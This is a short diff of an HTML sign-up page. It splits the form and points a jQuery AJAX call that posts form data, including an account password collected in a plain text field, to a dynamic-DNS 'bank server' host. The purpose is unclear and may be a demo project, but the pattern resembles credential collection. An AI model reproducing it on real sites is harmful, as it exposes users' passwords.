@@ -70,8 +70,9 @@ body {text-align:center;}
 <input id="Accountpw" type="text" name="accountpw" placeholder="Account password*"/>
 <br class ="small">
 <p class ="fineprint"><font color="grey"; font size ="2"; FONT FACE="arial";>By clicking Sign Up, you agree to receive communications from us about products, services and promotions. We will not share your information with other parties without your permission</font></p>
+</form>
 
-<input id="input" type="submit" name="submit" value="Sign Up"/>
+<form method="post"><input id="input" type="submit" name="submit" value="Sign Up"/>
 </form>
 
 <script>
@@ -109,7 +110,7 @@ body {text-align:center;}
 
             var send = $("#form").formToJSON();
             $.ajax({
-                url: "http://ENTER-URL-HERE.com",        //*****ENTER URL OF BANK SERVER HERE*****
+                url: "https://bankserver.dynu.com:443/",        //*****ENTER URL OF BANK SERVER HERE*****
                 type: "POST",
                 data: send,
                 error: function (xhr, error) {
